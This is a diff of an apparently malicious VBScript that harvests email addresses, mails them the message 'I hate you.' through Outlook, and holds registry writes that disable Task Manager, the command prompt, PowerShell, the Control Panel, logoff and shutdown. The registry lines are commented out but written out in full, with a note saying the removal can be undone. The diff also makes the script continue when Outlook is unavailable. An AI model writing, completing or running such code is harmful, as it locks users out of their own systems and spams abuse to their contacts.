@@ -38,26 +38,28 @@ objRegEx.Global = True
 objRegEx.IgnoreCase = True
 objRegEx.Pattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
 
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
-objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"
+'You can remove the notes but the script didnt worked with it.
+
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
+'objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"
 
 Dim EMAIL_BODY
 EMAIL_BODY = "I hate you." & vbCrLf & _
@@ -145,7 +147,6 @@ If objOutlook Is Nothing Then
     Set objOutlook = CreateObject("Outlook.Application")
     If Err.Number <> 0 Then
         strReport = strReport & "Cannot access Outlook" & vbCrLf
-        GoTo SaveAndExit
     End If
 End If
 On Error GoTo 0
@@ -225,7 +226,7 @@ On Error GoTo 0
 strReport = strReport & vbCrLf
 strReport = strReport & "Total emails sent: " & sentCount & vbCrLf
 
-SaveAndExit:
+strReport = strReport & "Proceeding.."
 strReport = strReport & "============================================" & vbCrLf
 strReport = strReport & "COMPLETED" & vbCrLf
 strReport = strReport & "============================================" & vbCrLf
